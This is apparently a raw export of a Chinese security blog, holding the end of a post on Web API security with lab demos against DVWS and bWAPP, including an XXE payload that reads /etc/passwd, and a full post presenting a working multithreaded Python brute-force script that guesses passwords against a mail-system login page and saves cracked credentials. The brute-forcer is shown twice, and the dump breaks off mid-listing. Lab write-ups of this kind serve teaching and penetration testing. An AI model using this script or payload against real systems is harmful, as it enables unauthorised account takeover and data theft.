&#123;</div><div class=\"line\">    &quot;name&quot;: &quot;Jason&quot;,</div><div class=\"line\">    &quot;age&quot;: &quot;99&quot;,</div><div class=\"line\">    &quot;sex&quot;: &quot;male&quot;,</div><div class=\"line\">    &quot;contact&quot;: &#123;</div><div class=\"line\">      &quot;mobile&quot;: &quot;13888888888&quot;,</div><div class=\"line\">      &quot;email&quot;: &quot;bingo@tass.com.cn&quot;,</div><div class=\"line\">      &quot;wechat&quot;: &quot;bingo&quot;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"API安全\"><a href=\"#API安全\" class=\"headerlink\" title=\"API安全\"></a>API安全</h1><h2 id=\"API的安全要素\"><a href=\"#API的安全要素\" class=\"headerlink\" title=\"API的安全要素\"></a>API的安全要素</h2><ul>\n<li><p>认证和鉴权 - 认证用户身份 &amp; 确定用户权限</p>\n<p>  通常情况下，webAPI是基于HTTP协议的，也是无状态传输的。故而认证任务就需要我们自己实现，所以原则上每一次API请求都需要带上身份认证信息，通常使用的是API key。</p>\n</li>\n<li><p>加密和签名 - 保证信息的保密性和完整性</p>\n<p>  通常使用SSL/TLS来加密通信消息，由API客户端发送和接收。签名用于确保API请求和响应在传输过程中未被篡改。</p>\n</li>\n<li><p>漏洞 - 注入攻击 &amp; 敏感数据泄露 &amp; 越权访问</p>\n</li>\n</ul>\n<h2 id=\"攻击面检测\"><a href=\"#攻击面检测\" class=\"headerlink\" title=\"攻击面检测\"></a>攻击面检测</h2><ul>\n<li>尽可能多的了解API端点、消息、参数、行为。</li>\n<li>发现API中可能存在问题的元数据。</li>\n<li>记录流量进一步学习API</li>\n<li>爆破 - 暴力破解路径或资源</li>\n</ul>\n<h2 id=\"攻击方式\"><a href=\"#攻击方式\" class=\"headerlink\" title=\"攻击方式\"></a>攻击方式</h2><p>1.模糊测试</p>\n<pre><code>使用自动化工具并行的将大量的随机内容（各种可能的值或可能的攻击向量）作为输入参数进行长时间的尝试，并自动验证响应信息，确认是否获取到意外收获（系统或代码相关的信息）。\n</code></pre><p>2.注入攻击</p>\n<pre><code>使用SQL,XML,Xpath,JSON,JavaScript等的常见攻击向量尝试进行代码注入，并验证意外响应。\n</code></pre><p>3.无效/越界内容</p>\n<pre><code>尝试各种无效或者超范围的内容，并验证响应信息。\n</code></pre><p>4.恶意内容</p>\n<pre><code>在上传功能点尝试上传可执行文件或脚本等，使服务器尝试进行解析。\n</code></pre><p>5.XSS</p>\n<pre><code>上传常见攻击向量进行XSS（反射型，存储型等）测试。\n</code></pre><p>6.CSRF</p>\n<pre><code>测试API是否含有token，token是否能复用，是否可被伪造。\n</code></pre><p>7.不安全的直接对象引用</p>\n<pre><code>尝试对顺序化的id号进行越权访问，尝试访问无权限的方法或操作。\n</code></pre><p>8.其它考虑</p>\n<pre><code>会话认证（token是否正确使用）\n安全配置（前述攻击照成系统/应用等信息泄露）\n</code></pre><h1 id=\"攻击演示\"><a href=\"#攻击演示\" class=\"headerlink\" title=\"攻击演示\"></a>攻击演示</h1><h2 id=\"1-DVWS-WSDL-Enumeration\"><a href=\"#1-DVWS-WSDL-Enumeration\" class=\"headerlink\" title=\"1. DVWS | WSDL Enumeration\"></a>1. DVWS | WSDL Enumeration</h2><p>前端页面<br><img src=\"/2017/07/Web-API接口安全了解/screenshot01.png\" alt=\"\"></p>\n<p>源码中暴露wsdl文件<br><img src=\"/2017/07/Web-API接口安全了解/screenshot02.png\" alt=\"\"></p>\n<p>wsdl文件中可以查看到四种方法<br><img src=\"/2017/07/Web-API接口安全了解/screenshot03.png\" alt=\"\"></p>\n<p>使用READY!API（SOAPUI升级版）可以直观的看到4种方法并进行接口测试</p>\n<p>尝试使用check_user_information方法，尝试填入username（实际测试中可能需要结合爆破方式），接口返回了相关数据，从而导致数据泄露。<br><img src=\"/2017/07/Web-API接口安全了解/screenshot04.png\" alt=\"\"></p>\n<h2 id=\"2-DVWS-XML-External-Entity-Processing\"><a href=\"#2-DVWS-XML-External-Entity-Processing\" class=\"headerlink\" title=\"2. DVWS | XML External Entity Processing\"></a>2. DVWS | XML External Entity Processing</h2><p>提交正常请求:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;name&gt;Mr.Bingo&lt;/name&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot21.png\" alt=\"\"><br>提交payload:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE bingo [  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot24.png\" alt=\"\"></p>\n<p>额外测试：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot22.png\" alt=\"\"><br><img src=\"/2017/07/Web-API接口安全了解/screenshot23.png\" alt=\"\"></p>\n<h2 id=\"3-DVWS-Server-Side-Request-Forgery\"><a href=\"#3-DVWS-Server-Side-Request-Forgery\" class=\"headerlink\" title=\"3. DVWS | Server Side Request Forgery\"></a>3. DVWS | Server Side Request Forgery</h2><p>正常数据请求</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot31.png\" alt=\"\"><br>篡改请求URL</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot32.png\" alt=\"\"></p>\n<h2 id=\"4-DVWS-REST-API-SQL-Injection\"><a href=\"#4-DVWS-REST-API-SQL-Injection\" class=\"headerlink\" title=\"4. DVWS | REST API SQL Injection\"></a>4. DVWS | REST API SQL Injection</h2><p>正常请求资源：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot41.png\" alt=\"\"></p>\n<p>SQL注入：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot42.png\" alt=\"\"></p>\n<h2 id=\"5-bWAPP-SQL-Injection-Blind-WS-SOAP\"><a href=\"#5-bWAPP-SQL-Injection-Blind-WS-SOAP\" class=\"headerlink\" title=\"5. bWAPP | SQL Injection - Blind (WS/SOAP)\"></a>5. bWAPP | SQL Injection - Blind (WS/SOAP)</h2><p>由于在前端屏蔽了后端所采用的API接口功能，故而贴出部分源码以供参考<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">if(isset($_REQUEST[&quot;title&quot;]))</div><div class=\"line\">&#123;   </div><div class=\"line\">    // Includes the NuSOAP library</div><div class=\"line\">    require_once(&quot;soap/nusoap.php&quot;);</div><div class=\"line\"></div><div class=\"line\">    // Creates an instance of the soap_client class</div><div class=\"line\">    $client = new nusoap_client(&quot;http://localhost/bWAPP/ws_soap.php&quot;);</div><div class=\"line\"></div><div class=\"line\">    // Calls the SOAP function</div><div class=\"line\">    $tickets_stock = $client-&gt;call(&quot;get_tickets_stock&quot;, array(&quot;title&quot; =&gt; sqli($_REQUEST[&quot;title&quot;])));</div><div class=\"line\"></div><div class=\"line\">    echo &quot;We have &lt;b&gt;&quot; . $tickets_stock . &quot;&lt;/b&gt; movie tickets available in our stock.&quot;;</div><div class=\"line\">&#125;</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot50.png\" alt=\"\"></p>\n<blockquote>\n<p>  当前个人对API接口测试的理解尚比较粗浅。涉及到fuzz、加解密及其他复杂的场景尚且无法拿出好的案例及测试平台。后续有机会再行补充，另外，希望有货的大佬们能多多分享。</p>\n</blockquote>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><h2 id=\"测试工具\"><a href=\"#测试工具\" class=\"headerlink\" title=\"测试工具\"></a>测试工具</h2><ul>\n<li>Ready!API ( SoapUI )</li>\n<li>Burpsuite</li>\n<li><p>FuzzAPI</p>\n<h2 id=\"测试平台\"><a href=\"#测试平台\" class=\"headerlink\" title=\"测试平台\"></a>测试平台</h2></li>\n<li><p>DVWS  <a href=\"https://github.com/snoopythesecuritydog/dvws\">https://github.com/snoopythesecuritydog/dvws</a></p>\n</li>\n<li><p>bWAPP <a href=\"https://sourceforge.net/projects/bwapp/\">https://sourceforge.net/projects/bwapp/</a></p>\n</li>\n<li><p>Hackazon  <a href=\"https://github.com/rapid7/hackazon\">https://github.com/rapid7/hackazon</a></p>\n<p>  Web Version <a href=\"http://hackazon.webscantest.com\">http://hackazon.webscantest.com</a></p>\n</li>\n<li><p>Mutillidae    <a href=\"https://sourceforge.net/projects/mutillidae/\">https://sourceforge.net/projects/mutillidae/</a></p>\n</li>\n<li><p>Juice-shop    <a href=\"https://github.com/bkimminich/juice-shop\">https://github.com/bkimminich/juice-shop</a></p>\n</li>\n</ul>\n<h2 id=\"参考资料-1\"><a href=\"#参考资料-1\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><p>OWASP Top 10 - 2017 RC1</p>\n</li>\n<li><p>REST API 安全设计指南 <a href=\"http://www.freebuf.com/articles/web/82108.html\">http://www.freebuf.com/articles/web/82108.html</a></p>\n</li>\n<li><p>REST Security Cheat Sheet <a href=\"https://www.owasp.org/index.php/REST_Security_Cheat_Sheet\">https://www.owasp.org/index.php/REST_Security_Cheat_Sheet</a></p>\n</li>\n</ul>"},{"title":"多线程爆破脚本(python3)","date":"2017-06-27T01:05:31.000Z","_content":">   起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。\n\n## 主要功能\n脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 \n\n关于这个库的使用，可以参考我之前写过的blog：[Python argparse模块详解](http://oddboy.cn/2017/06/Python-argparse模块详解/)\n\n```\n➜  pythonCode python3 BingoBF.py -h\n        .--.\n       |o_o |    ------------------\n       |:_/ |   < Author: Mr.Bingo >\n      //   \\ \\   ------------------\n     (|     | ) <    oddboy.cn     >\n    /'\\_   _/`\\  ------------------\n    \\___)=(___/\n\nusage: BingoBF [options]\n\nBrute Force 【https://mail.xxx.com] email's passwords.\n\noptional arguments:\n  -h, --help   show this help message and exit\n  -u USERNAME  username\n  -U USERLIST  usernames\n  -p PASSWORD  password\n  -P PWDLIST   passwords\n  -o OUTPUT    print results to file\n  -t THREAD    mutli threads, default 3 threads\n\n+---+\n```\n<!-- more -->\n## 代码解释\n```\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport logging\nimport argparse\nimport queue\nimport requests\nimport threading\nimport os\nimport time\nimport random\nfrom html.parser import HTMLParser\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n# disable InsecureRequestWarning\n# 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：\n# https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho\n\nlogging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）\n\n# general settings\n\ntarget_url=\"https://mail.xxx.com/UserLogin.aspx\"\n\nwriteFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。\nthreadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。\n\n# 保存爆破结果\ndef saveFile(message,outfilePath):\n    with open(outfilePath, 'a+', encoding = 'utf8') as f:  # 以追加的方法结果写入文件\n        f.write(message[0]+\"\\t\")\n        f.write(message[1]+\"\\n\")\n\n# 自定义一个Exception类,用于显示自定义的异常。\nclass validcodeException(BaseException):\n    def __init__(self,mesg=\" @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!\"):\n        print(mesg)\n\n# 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser\nclass BruteParser(HTMLParser):\n    def __init__(self):\n        HTMLParser.__init__(self)\n        self.tag_results = {}\n\n    def handle_starttag(self, tag, attrs):\n        if tag == \"input\":\n            tag_name = None\n            tag_value = None\n            for name, value in attrs:\n                if name == \"name\":\n                    tag_name = value\n                if name == \"value\":\n                    tag_value = value\n            if (tag_name == \"__VIEWSTATE\") or (tag_name == \"__VIEWSTATEGENERATOR\") or (tag_name == \"__EVENTVALIDATION\"):\n                self.tag_results[tag_name] = tag_value\n\n# 核心实现类\nclass Bruter(object):\n    def __init__(self, threads,userList,pwdList,outfilePath):\n        self.user_q=userList\n        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。\n        self.threads=threads\n        self.outfilePath=outfilePath\n        print(\"Total %d(%d * %d) tries( %d threads)\"% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))\n\n    # 线程的创建与管理\n    def run_bruteforce(self):\n        thread_arr=[]       # 线程列表list\n        for i in range(self.threads):\n            t = threading.Thread(target=self.web_bruter)\n            thread_arr.append(t)            # 创建线程\n        for i in range(self.threads):\n            thread_arr[i].start()           # 开启线程\n        for i in range(self.threads):\n            thread_arr[i].join()            # 回归线程\n\n    # 核心方法\n    def web_bruter(self):\n        proxies = { \n            \"http\": \"http://127.0.0.1:8080\", \n            \"https\": \"https://127.0.0.1:8080\", \n        }       # Burpsuite的代理地址\n\n        # 初始化cookie以及hidden元素数据。\n        response = requests.get(target_url,proxies=proxies,verify=False)\n        cookie=response.cookies\n\n        # 解析异常表单字段\n        parser = BruteParser()\n        parser.feed(response.text)\n        post_tags = parser.tag_results\n        post_tags['cmdSubmit.x']=random.randint(1,47)       # 登录按钮图片 47x39像素\n        post_tags['cmdSubmit.y']=random.randint(1,39)\n\n        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。\n        while not self.user_q.empty():\n            username = self.user_q.get().rstrip().decode(\"ascii\")\n            for password in self.pwdlist:\n                password=password.decode(\"ascii\")\n                post_tags[\"txtUsername\"]=username\n                post_tags[\"txtPassword\"]=password\n                \n                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。\n                # \\r将光标回退到行首（\\b回退一格）,实现原地覆盖。\n                print(\" \\b\\b\"*100,end=\"\")       # 退两格，清空一格。 实现清空。\n                print(\"\\rTrying: %15s : %15s  (%d users left)\" % (username,password, self.user_q.qsize()),end=\"\")\n                #time.sleep(2)          # 调试时使用的\n                threadLock.release()    # 释放线程锁\n                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)\n\n                if (\"欢迎使用XXX邮件系统\" in reqResult.text):   # 爆破成功\n                    threadLock.acquire()    # 取得线程锁\n                    print(\" \\b\\b\"*100,end=\"\")\n                    print (\"\\r[*] -->  %15s\\t%15s\" % (username,password))   # 打印到窗口\n                    #time.sleep(2)\n                    threadLock.release()    # 释放线程锁\n                    if self.outfilePath is not None:    # 输出到文件\n                        # 获取文件锁\n                        writeFileLock.acquire()\n                        try:\n                            # 追加到文件\n                            saveFile((username,password),self.outfilePath)\n                        finally:\n                            # 释放锁\n                            writeFileLock.release()\n                    break   # 跳出当前循环，进行下一个用户名爆破\n                if (\"您输入的验证码不正确，请重新输入!\" in reqResult.text): # 验证码错误，抛出异常！\n                    raise validcodeException(\"验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆\")\n                    exit    # 退出！ 理论上不会执行这一句。\n                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。\n\n                if  (\"对不起, 您输入的用户名或口令错误, 请重新输入。\" in reqResult.text):\n                    pass        # 占一个坑，没鸟用\n                pass\n\n                #time.sleep(2)\n# 读取文件，生成队列\ndef build_list(listFile):   \n    # read in the list file\n    fd = open(listFile, \"rb\")\n    raw_words = fd.readlines()\n    fd.close()\n\n    words = queue.Queue()\n\n    for word in raw_words:\n        word = word.rstrip()\n        words.put(word)\n    return words\n\n\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # 创建一个argparser解析器\n    parser=argparse.ArgumentParser(\n        prog=\"BingoBF\",\n        usage=\" %(prog)s [options] \",\n        description='Brute Force 【https://mail.xxx.com] email\\'s passwords.',\n        epilog=\"+---+\\n\"\n        )\n\n    groupUser = parser.add_mutually_exclusive_group(required=True)\n    groupUser.add_argument('-u',dest=\"username\",help=\"username\")\n    groupUser.add_argument('-U',dest='userList',help=\"usernames\")\n\n    groupPwd = parser.add_mutually_exclusive_group(required=True)\n    groupPwd.add_argument('-p',dest=\"password\",help=\"password\")\n    groupPwd.add_argument('-P',dest='pwdList',help=\"passwords\")\n\n    parser.add_argument('-o',dest='output',help=\"print results to file\")\n\n    parser.add_argument(\"-t\",dest=\"thread\",type=int,help=\"mutli threads, default 3 threads\",default=3)\n\n    args=parser.parse_args()    # 命令行参数解析\n    \n    if args.username is not None:\n        userList=list(args.username)\n    else:\n        userList = build_list(args.userList)\n    if args.password is not None:\n        pwdList=list(args.password)\n    else:\n        pwdList = build_list(args.pwdList)\n\n    outfilePath = None\n    if args.output is not None:\n        outfilePath = args.output\n        filePath,fileName=os.path.split(outfilePath)\n        if (filePath!=\"\") and (not os.path.exists(filePath)):\n            os.mikedirs(filePath)   # 若不存在这个目录则递归创建\n\n    if args.thread is not None:\n        user_thread=args.thread\n\n    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)\n    bruter_obj.run_bruteforce()\n\nif __name__ == '__main__':\n    main()\n```\n## 调用sample\n```\n➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt\n```\n\n## 附赠\n命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。","source":"_posts/多线程爆破脚本-python3.md","raw":"---\ntitle: 多线程爆破脚本(python3)\ndate: 2017-06-27 09:05:31\ntags: Python\n---\n>   起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。\n\n## 主要功能\n脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 \n\n关于这个库的使用，可以参考我之前写过的blog：[Python argparse模块详解](http://oddboy.cn/2017/06/Python-argparse模块详解/)\n\n```\n➜  pythonCode python3 BingoBF.py -h\n        .--.\n       |o_o |    ------------------\n       |:_/ |   < Author: Mr.Bingo >\n      //   \\ \\   ------------------\n     (|     | ) <    oddboy.cn     >\n    /'\\_   _/`\\  ------------------\n    \\___)=(___/\n\nusage: BingoBF [options]\n\nBrute Force 【https://mail.xxx.com] email's passwords.\n\noptional arguments:\n  -h, --help   show this help message and exit\n  -u USERNAME  username\n  -U USERLIST  usernames\n  -p PASSWORD  password\n  -P PWDLIST   passwords\n  -o OUTPUT    print results to file\n  -t THREAD    mutli threads, default 3 threads\n\n+---+\n```\n<!-- more -->\n## 代码解释\n```\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport logging\nimport argparse\nimport queue\nimport requests\nimport threading\nimport os\nimport time\nimport random\nfrom html.parser import HTMLParser\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n# disable InsecureRequestWarning\n# 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：\n# https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho\n\nlogging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）\n\n# general settings\n\ntarget_url=\"https://mail.xxx.com/UserLogin.aspx\"\n\nwriteFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。\nthreadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。\n\n# 保存爆破结果\ndef saveFile(message,outfilePath):\n    with open(outfilePath, 'a+', encoding = 'utf8') as f:  # 以追加的方法结果写入文件\n        f.write(message[0]+\"\\t\")\n        f.write(message[1]+\"\\n\")\n\n# 自定义一个Exception类,用于显示自定义的异常。\nclass validcodeException(BaseException):\n    def __init__(self,mesg=\" @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!\"):\n        print(mesg)\n\n# 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser\nclass BruteParser(HTMLParser):\n    def __init__(self):\n        HTMLParser.__init__(self)\n        self.tag_results = {}\n\n    def handle_starttag(self, tag, attrs):\n        if tag == \"input\":\n            tag_name = None\n            tag_value = None\n            for name, value in attrs:\n                if name == \"name\":\n                    tag_name = value\n                if name == \"value\":\n                    tag_value = value\n            if (tag_name == \"__VIEWSTATE\") or (tag_name == \"__VIEWSTATEGENERATOR\") or (tag_name == \"__EVENTVALIDATION\"):\n                self.tag_results[tag_name] = tag_value\n\n# 核心实现类\nclass Bruter(object):\n    def __init__(self, threads,userList,pwdList,outfilePath):\n        self.user_q=userList\n        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。\n        self.threads=threads\n        self.outfilePath=outfilePath\n        print(\"Total %d(%d * %d) tries( %d threads)\"% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))\n\n    # 线程的创建与管理\n    def run_bruteforce(self):\n        thread_arr=[]       # 线程列表list\n        for i in range(self.threads):\n            t = threading.Thread(target=self.web_bruter)\n            thread_arr.append(t)            # 创建线程\n        for i in range(self.threads):\n            thread_arr[i].start()           # 开启线程\n        for i in range(self.threads):\n            thread_arr[i].join()            # 回归线程\n\n    # 核心方法\n    def web_bruter(self):\n        proxies = { \n            \"http\": \"http://127.0.0.1:8080\", \n            \"https\": \"https://127.0.0.1:8080\", \n        }       # Burpsuite的代理地址\n\n        # 初始化cookie以及hidden元素数据。\n        response = requests.get(target_url,proxies=proxies,verify=False)\n        cookie=response.cookies\n\n        # 解析异常表单字段\n        parser = BruteParser()\n        parser.feed(response.text)\n        post_tags = parser.tag_results\n        post_tags['cmdSubmit.x']=random.randint(1,47)       # 登录按钮图片 47x39像素\n        post_tags['cmdSubmit.y']=random.randint(1,39)\n\n        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。\n        while not self.user_q.empty():\n            username = self.user_q.get().rstrip().decode(\"ascii\")\n            for password in self.pwdlist:\n                password=password.decode(\"ascii\")\n                post_tags[\"txtUsername\"]=username\n                post_tags[\"txtPassword\"]=password\n                \n                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。\n                # \\r将光标回退到行首（\\b回退一格）,实现原地覆盖。\n                print(\" \\b\\b\"*100,end=\"\")       # 退两格，清空一格。 实现清空。\n                print(\"\\rTrying: %15s : %15s  (%d users left)\" % (username,password, self.user_q.qsize()),end=\"\")\n                #time.sleep(2)          # 调试时使用的\n                threadLock.release()    # 释放线程锁\n                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)\n\n                if (\"欢迎使用XXX邮件系统\" in reqResult.text):   # 爆破成功\n                    threadLock.acquire()    # 取得线程锁\n                    print(\" \\b\\b\"*100,end=\"\")\n                    print (\"\\r[*] -->  %15s\\t%15s\" % (username,password))   # 打印到窗口\n                    #time.sleep(2)\n                    threadLock.release()    # 释放线程锁\n                    if self.outfilePath is not None:    # 输出到文件\n                        # 获取文件锁\n                        writeFileLock.acquire()\n                        try:\n                            # 追加到文件\n                            saveFile((username,password),self.outfilePath)\n                        finally:\n                            # 释放锁\n                            writeFileLock.release()\n                    break   # 跳出当前循环，进行下一个用户名爆破\n                if (\"您输入的验证码不正确，请重新输入!\" in reqResult.text): # 验证码错误，抛出异常！\n                    raise validcodeException(\"验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆\")\n                    exit    # 退出！ 理论上不会执行这一句。\n                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。\n\n                if  (\"对不起, 您输入的用户名或口令错误, 请重新输入。\" in reqResult.text):\n                    pass        # 占一个坑，没鸟用\n                pass\n\n                #time.sleep(2)\n# 读取文件，生成队列\ndef build_list(listFile):   \n    # read in the list file\n    fd = open(listFile, \"rb\")\n    raw_words = fd.readlines()\n    fd.close()\n\n    words = queue.Queue()\n\n    for word in raw_words:\n        word = word.rstrip()\n        words.put(word)\n    return words\n\n\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # 创建一个argparser解析器\n    parser=argparse.ArgumentParser(\n        prog=\"BingoBF\",\n        usage=\" %(prog)s [options] \",\n        description='Brute Force 【https://mail.xxx.com] email\\'s passwords.',\n        epilog=\"+---+\\n\"\n        )\n\n    groupUser = parser.add_mutually_exclusive_group(required=True)\n    groupUser.add_argument('-u',dest=\"username\",help=\"username\")\n    groupUser.add_argument('-U',dest='userList',help=\"usernames\")\n\n    groupPwd = parser.add_mutually_exclusive_group(required=True)\n    groupPwd.add_argument('-p',dest=\"password\",help=\"password\")\n    groupPwd.add_argument('-P',dest='pwdList',help=\"passwords\")\n\n    parser.add_argument('-o',dest='output',help=\"print results to file\")\n\n    parser.add_argument(\"-t\",dest=\"thread\",type=int,help=\"mutli threads, default 3 threads\",default=3)\n\n    args=parser.parse_args()    # 命令行参数解析\n    \n    if args.username is not None:\n        userList=list(args.username)\n    else:\n        userList = build_list(args.userList)\n    if args.password is not None:\n        pwdList=list(args.password)\n    else:\n        pwdList = build_list(args.pwdList)\n\n    outfilePath = None\n    if args.output is not None:\n        outfilePath = args.output\n        filePath,fileName=os.path.split(outfilePath)\n        if (filePath!=\"\") and (not os.path.exists(filePath)):\n            os.mikedirs(filePath)   # 若不存在这个目录则递归创建\n\n    if args.thread is not None:\n        user_thread=args.thread\n\n    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)\n    bruter_obj.run_bruteforce()\n\nif __name__ == '__main__':\n    main()\n```\n## 调用sample\n```\n➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt\n```\n\n## 附赠\n命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。","slug":"多线程爆破脚本-python3","published":1,"updated":"2017-06-27T02:00:40.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hsr000cvquvfa8t7bpf","content":"<blockquote>\n<p>  起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。</p>\n</blockquote>\n<h2 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h2><p>脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 </p>\n<p>关于这个库的使用，可以参考我之前写过的blog：<a href=\"http://oddboy.cn/2017/06/Python-argparse模块详解/\">Python argparse模块详解</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  pythonCode python3 BingoBF.py -h</div><div class=\"line\">        .--.</div><div class=\"line\">       |o_o |    ------------------</div><div class=\"line\">       |:_/ |   &lt; Author: Mr.Bingo &gt;</div><div class=\"line\">      //   \\ \\   ------------------</div><div class=\"line\">     (|     | ) &lt;    oddboy.cn     &gt;</div><div class=\"line\">    /&apos;\\_   _/`\\  ------------------</div><div class=\"line\">    \\___)=(___/</div><div class=\"line\"></div><div class=\"line\">usage: BingoBF [options]</div><div class=\"line\"></div><div class=\"line\">Brute Force 【https://mail.xxx.com] email&apos;s passwords.</div><div class=\"line\"></div><div class=\"line\">optional arguments:</div><div class=\"line\">  -h, --help   show this help message and exit</div><div class=\"line\">  -u USERNAME  username</div><div class=\"line\">  -U USERLIST  usernames</div><div class=\"line\">  -p PASSWORD  password</div><div class=\"line\">  -P PWDLIST   